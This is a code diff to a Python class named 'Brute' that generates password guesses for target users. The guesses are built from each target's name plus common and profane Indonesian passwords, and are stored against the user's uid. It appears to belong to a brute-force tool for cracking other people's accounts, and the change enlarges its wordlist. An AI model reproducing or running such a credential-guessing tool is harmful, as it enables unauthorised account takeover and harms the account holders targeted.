@@ -88,8 +88,8 @@ class Brute:
 				obj = user['name'].split(' ')
 				if len(obj) == 1:
 					listpass = [
-                                                obj[0]+'123', obj[0]+'1234', obj[0]+'ADM', obj[0]+'MDV', obj[0]+'jr', obj[0]+'12', 'SEIG SHEIL', 'AnjingPeanut', 'nobita', 'shizuka', 'memek', 'memek123', 'memek1234', 'memek12345',
-						obj[0]+'12345', obj[0]+'sayang', obj[0]'98', obj[0]+'123456', obj[0]+'99', 'anjing', 'bangsat', 'kontol123', 'kontol', 'kontol1234', 'kontol12345', 'iribilangboss', 'freefire',
+                                                obj[0]+'123', obj[0]+'1234', 'SEIG SHEIL', 'AnjingPeanut', 'nobita', 'shizuka', 'memek', 'memek123', 'memek1234', 'memek12345',
+						obj[0]+'12345', obj[0]+'sayang', 'anjing', 'bangsat', 'kontol123', 'kontol', 'kontol1234', 'kontol12345', 'iribilangboss', 'freefire',  'zilong', 'iwanfals', 'slankker', 'slank123', 'bandung123', 'bandung1234', 'bandung12345', 'lupasandi', 'gaktaulupa', 'password', 'bangsat123', 'entahapa', 'anakduniamaya', 'indonesiaku', 'assalamualaikum', 'waalaikumsalam', 'markanjing', 'markbangsat',
                                                 obj[0]+'aku', 'pakistan12', 'pakistan123', 'pakistan1234', 'pakistan1', 'brigez', 'xtc12345', 'sasuke', 'naruto', 'iloveyou', 'sayangkamu', 'lupapassword', 'kata sandi', 'jepang',
 					]
 				self.target.append({'id': user['uid'], 'pw': listpass})
